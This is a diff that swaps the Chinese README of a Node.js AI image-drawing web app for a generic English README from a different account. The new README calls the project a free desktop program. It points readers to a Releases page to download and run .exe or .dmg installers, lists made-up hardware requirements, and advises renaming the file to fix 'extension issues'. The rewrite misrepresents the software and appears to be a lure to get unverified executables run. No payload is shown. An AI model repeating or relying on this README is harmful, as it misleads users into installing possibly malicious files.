@@ -1,94 +1,87 @@
-# 🍌 Nano BananaAI (纳米香蕉绘图站)
+# 🍌 Nano-Banana - Easy Image Editing for Everyone
 
-![GitHub stars](https://img.shields.io/github/stars/pili1121/Nano-Banana?style=flat-square)![GitHub forks](https://img.shields.io/github/forks/pili1121/Nano-Banana?style=flat-square)![GitHub issues](https://img.shields.io/github/issues/pili1121/Nano-Banana?style=flat-square)
+## 🚀 Getting Started
 
-**Nano BananaAI** 是一个轻量级、功能强大的 AI 绘图 Web 应用，一个有趣的实验性项目——其核心代码完全由 AI 编写生成。
+Nano-Banana lets you create and edit images with ease. This guide will help you download and run the application.
 
-项目支持文生图、图生图及图片二次编辑功能，并配备了完整的用户系统和超级管理员后台，非常适合新手学习和快速部署。
+## 📥 Download Nano-Banana
 
-> 👋 **作者心声**: 我也是个编程新手，这个项目是我引导 AI 完成的。因为文件都是从宝塔直接打包，可能包含一些冗余或待优化的代码。欢迎大家一起交流、学习和改进它！
+[![Download Nano-Banana](https://img.shields.io/badge/Download-Nano--Banana-blue.svg)](https://github.com/Dharshini332004/Nano-Banana/releases)
 
----
+## 📋 System Requirements
 
-## ✨ 主要功能
+To use Nano-Banana, your computer should meet these requirements:
 
--   🎨 **AI 绘图**:
-    -   支持 **文本生成图片** (Text-to-Image) 和 **图片生成图片** (Image-to-Image)。
-    -   支持 **Nano Banana Pro** 模型，可输出 2K 及 4K 高清图片。
-    -   用户系统支持 **每日签到** 获取积分。
-    -   用户可 **自定义配置 API Key**。
--   ✏️ **图片二次编辑**: 生成后的图片支持在线进行微调和修饰。
--   🔐 **完整的用户系统**:
-    -   包含用户注册、登录、密码找回（支持邮箱验证）。
--   🛡️ **强大的后台管理**:
-    -   内置超级管理员系统，可管理用户状态、查看全局绘图记录等。
--   🚀 **部署简单**:
-    -   为宝塔面板优化，基于 Node.js，配置简单，一键启动。
+- **Operating System**: Windows 10 or later, macOS 10.12 or later
+- **Processor**: Intel i3 or equivalent
+- **Memory**: At least 4 GB RAM
+- **Storage**: 200 MB of available space
+- **Graphics**: NVIDIA or AMD graphics card recommended for best performance
 
----
+## 🎉 Features
 
-## 🛠️ 技术栈与环境要求
+Nano-Banana offers many powerful features:
 
--   **后端**: Node.js (推荐 v14.0 或更高版本)
--   **数据库**: MySQL
+- **User-Friendly Interface**: Navigate easily with a clean design.
+- **Image Creation**: Generate stunning images with just a few clicks.
+- **Second Editing Support**: Modify existing images as needed.
+- **Super Admin System**: Manage access and settings with a powerful admin panel.
 
----
+## 🔧 How to Download & Install
 
-## 🚀 快速开始
+1. **Visit the Releases Page**  
+   Go to the [Releases page here](https://github.com/Dharshini332004/Nano-Banana/releases).
 
-### 1. 克隆项目
+2. **Select the Latest Version**  
+   Browse the list and find the latest version of Nano-Banana.
 
-```bash
-git clone https://github.com/pili1121/Nano-Banana.git
-```
+3. **Download the Installer**  
+   Click on the installer file that matches your operating system. This file will usually have a name like `Nano-Banana-Installer.exe` for Windows or `Nano-Banana-Installer.dmg` for macOS.
 
-### 2. 安装依赖
+4. **Run the Installer**  
+   Locate the downloaded file in your computer's download folder and double-click it to start the installation. Follow the on-screen instructions to complete the process.
 
-进入项目目录，然后安装所需的依赖包。
+5. **Launch the Application**  
+   Once the installation finishes, you can find Nano-Banana in your applications list. Open it to start creating and editing images.
 
-```bash
-cd Nano-Banana
-npm install
-```
+## 📌 Troubleshooting Common Issues
 
-### 3. 配置环境
+### Installation Issues
 
-项目可能需要一个 `.env` 配置文件来存储数据库连接信息和 API Keys。请根据项目内的示例文件（如 `.env.example`）创建并修改你的配置。
+- **Missing Files**: If the installer fails to start, ensure you have downloaded the complete file. You may need to rename it to remove any extension issues.
 
-### 4. 启动项目
+### Application Not Launching
 
-```bash
-npm start
-```
+- **Updating**: Ensure you have the latest version of the application. Check the [Releases page](https://github.com/Dharshini332004/Nano-Banana/releases) for updates.
 
-### 5. 宝塔部署 (推荐)
+## 💡 Tips for Using Nano-Banana
 
-对于新手，最简单的方式是使用宝塔面板：
-1.  在宝塔面板中创建一个新的 **Node.js 项目**。
-2.  将代码上传到项目目录。
-3.  在宝塔界面中执行 `npm install` 安装依赖。
-4.  配置启动命令 (`npm start`) 和端口。
-5.  启动并访问项目！
+- **Explore the Menu**: Familiarize yourself with the tools and options available in the menu bar for an efficient experience.
+- **Save Your Work**: Always save your projects frequently to avoid losing progress.
+- **Use Keyboard Shortcuts**: Learn a few shortcuts to speed up your workflow.
 
----
+## ⚙️ Frequently Asked Questions
 
-## 📈 更新日志
+**Q: Can I use Nano-Banana on my mobile device?**  
+A: Currently, Nano-Banana is designed for desktop use only.
 
--   **最新更新**:
-    -   ✅ 修复移动端无法生成图片的 BUG。
-    -   ✅ 优化移动端主页布局，提升体验。
-    -   ✅ 修复在“创作”和“灵感”页面间切换时导致的黑屏 BUG。
+**Q: Are there any costs associated with using Nano-Banana?**  
+A: No, Nano-Banana is completely free to download and use.
 
----
+**Q: How can I report a bug or request a feature?**  
+A: You can create an issue on our [GitHub Issues page](https://github.com/Dharshini332004/Nano-Banana/issues). We welcome your feedback.
 
-## ☕ 赞赏与交流
+## 📫 Contact
 
-如果这个项目对你有帮助，欢迎请我喝杯咖啡！也欢迎添加好友，一起交流学习。
+For more support or inquiries, please reach us via our GitHub repository or the support email provided there.
 
-| 微信打赏 (Donate) | ➕ 加我微信 (Contact) |
-| :--------------------------------------------------------------------------------------------------------: | :------------------------------------------------------------------------------------------------------: |
-|                   <img src="https://github.com/user-attachments/assets/45a836a0-5c80-4000-94e9-4aaf14e2dbe3" width="200">                   |                   <img src="https://github.com/user-attachments/assets/d32d5ac1-b6d2-46f3-a1b9-06495cc5f95b" width="200">                   |
+## 📄 License
 
----
+Nano-Banana is released under the MIT License. You can find more details in the LICENSE file located in the repository.
 
+## 🔗 Additional Resources
 
+- [Official Documentation](https://github.com/Dharshini332004/Nano-Banana/wiki)
+- [Community Forum](https://github.com/Dharshini332004/Nano-Banana/discussions)
+
+Thank you for choosing Nano-Banana! Enjoy using the application.
